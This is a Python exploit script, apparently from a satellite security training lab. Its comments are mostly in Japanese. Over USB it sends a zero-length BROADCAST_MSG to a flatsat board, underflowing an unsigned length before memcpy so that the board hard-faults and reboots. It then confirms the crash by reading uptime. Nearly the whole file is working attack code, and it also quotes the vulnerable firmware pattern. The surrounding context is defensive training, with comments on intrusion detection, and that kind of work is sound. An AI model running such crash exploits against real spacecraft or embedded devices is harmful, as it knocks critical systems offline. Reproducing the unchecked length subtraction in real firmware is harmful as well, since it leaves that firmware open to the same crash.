@@ -1,0 +1,120 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+#
+# 01_fuzzing_crash_usb.py -- BROADCAST_MSG の整数アンダーフローを、USB経由で起こす。
+#
+#     worker.cpp:
+#       size_t msg_len = payload_total - 2;      <- 符号なし（負の数を表せない）
+#       memcpy(buffer_msg, space_packet->data + 2, msg_len);
+#
+# 復号すると0オクテット（0バイト）になるペイロードを送ると、この引き算は
+# 負の値にならずに一周して約42.9億になる。これがアンダーフローである。その
+# 巨大な長さのまま memcpy（メモリのコピー）が実行される。攻撃はこれだけである。
+#
+# クラッシュはペイロードを解釈する処理の中で起きる。無線の処理に届く30行前
+# なので、無線をリセット状態に止めてある演習用ビルドでもまったく同じように動く。
+#
+# 予想される結果: ボードはハードフォールト（CPUが続行できない致命的な異常）を
+# 起こして再起動する。CDCポート（USBシリアルのポート）が切れ、数秒後に
+# 再認識される。そのため、このスクリプト自身の接続は残らない。ボードの
+# テキストコンソールか PWNSAT-C3 を見る（稼働時間が0に戻る）。
+
+import argparse
+import struct
+import sys
+from pathlib import Path
+
+sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))
+
+from flatsat import FlatSat, TC_BROADCAST_MSG, TC_GET_STATUS  # noqa: E402
+
+STATUS_UPTIME_OFFSET = 12       # uint32 のリトルエンディアン。worker.cpp のSTATUS組み立て処理を参照
+
+
+def read_uptime(fsat, seq):
+    """STATUS の返事から、起動してからの秒数（稼働時間）を読む。返事がなければ None。"""
+    for p in fsat.send(TC_GET_STATUS, b"", seq=seq & 0x3FFF, listen=2.0):
+        if p.apid != 0x0C:
+            continue
+        body = fsat.plaintext(p)
+        if len(body) >= STATUS_UPTIME_OFFSET + 4:
+            return struct.unpack_from("<I", body, STATUS_UPTIME_OFFSET)[0]
+    return None
+
+
+def main() -> int:
+    ap = argparse.ArgumentParser(description=__doc__,
+                                 formatter_class=argparse.RawDescriptionHelpFormatter)
+    ap.add_argument("--port", default=None)
+    ap.add_argument("--seq", type=int, default=1)
+    ap.add_argument("--cleartext", action="store_true")
+    ap.add_argument("--sweep", action="store_true",
+                    help="walk the declared length down instead of one shot")
+    args = ap.parse_args()
+
+    print("[*] BROADCAST_MSG with a zero-octet payload.")
+    print("[*] msg_len = payload_total - 2 underflows once this decrypts to nothing.")
+
+    def say_refusals(packets, fsat):
+        """ボードは拒否の理由を平易な言葉で返してくる。表示すれば「ゲートが閉じているだけ」と
+        わかる。表示しなければ、演習が壊れているように見えてしまう。"""
+        for p in packets:
+            if p.apid == 0x09:
+                reason = fsat.plaintext(p).split(b"\x00", 1)[0]
+                print(f"[!] the board refused: {reason.decode('ascii', 'replace').strip()}")
+
+    uptime_before = None
+    try:
+        with FlatSat(port=args.port, encrypt=not args.cleartext) as fsat:
+            uptime_before = read_uptime(fsat, args.seq + 90)
+            if uptime_before is not None:
+                print(f"[*] uptime before: {uptime_before} s")
+
+            if args.sweep:
+                print("\n=== walking the declared length down ===")
+                for n, total in enumerate(range(12, -1, -1)):
+                    print(f"    declared {total}")
+                    say_refusals(
+                        fsat.send(TC_BROADCAST_MSG, b"\x00" * max(total, 0),
+                                  seq=(args.seq + n) & 0x3FFF, listen=0.4), fsat)
+            else:
+                say_refusals(
+                    fsat.send(TC_BROADCAST_MSG, b"", seq=args.seq, listen=1.0),
+                    fsat)
+    except Exception as exc:                   # クラッシュで、書き込みの途中にポートが切れることがある
+        print(f"[+] the link died during the send ({type(exc).__name__}). "
+              f"That is usually the fault, not an error in this script.")
+        return 0
+
+    # Space IDS（侵入検知システム）を経由するとき、攻撃スクリプトが握っているのは
+    # ケーブルではなくTCPソケットである。このソケットはボードが再起動しても切れない。
+    # ポートを失うのはセンサーで、このスクリプトではない。そのため、クラッシュしたか
+    # どうかはボード自身の稼働時間から読み取る必要がある。
+    print("\n=== did it reboot? ===")
+    try:
+        with FlatSat(port=args.port, encrypt=not args.cleartext,
+                     verbose=False) as fsat:
+            uptime_after = read_uptime(fsat, args.seq + 95)
+    except Exception:
+        uptime_after = None
+
+    if uptime_before is None or uptime_after is None:
+        print("[*] could not read the uptime on both sides. Watch it in "
+              "PWNSAT-C3 instead: a reboot takes it back to zero.")
+    elif uptime_after < uptime_before:
+        print(f"[+] uptime {uptime_before} s -> {uptime_after} s. "
+              f"The board hard-faulted and came back. That is the crash.")
+    else:
+        print(f"[-] uptime {uptime_before} s -> {uptime_after} s, still "
+              f"climbing. The board did not fall over.")
+        print("[*] Try --sweep. If the link is in its encrypted mode the "
+              "payload has to decrypt to nothing, so a cleartext run does "
+              "something different.")
+    print("\nWhat the sensor should have shown: a declared length that does not "
+          "match the frame,\nand a length below the header the application "
+          "subtracts from it.")
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
